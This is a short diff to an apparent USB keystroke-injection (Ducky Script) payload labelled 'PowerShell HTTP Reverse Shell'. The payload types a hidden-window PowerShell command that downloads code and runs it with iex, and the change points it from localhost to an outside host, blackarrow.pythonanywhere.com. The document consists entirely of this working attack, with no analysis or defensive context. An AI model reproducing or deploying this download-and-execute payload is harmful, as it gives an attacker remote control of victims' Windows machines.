@@ -2,5 +2,5 @@ REM PowerShell HTTP Reverse Shell
 DELAY 1000
 CTRL ESC
 DELAY 100
-STRING powershell -w h iex (Invoke-WebRequest localhost/windows/).Content
+STRING powershell -w h iex (Invoke-WebRequest blackarrow.pythonanywhere.com/windows/).Content
 ENTER
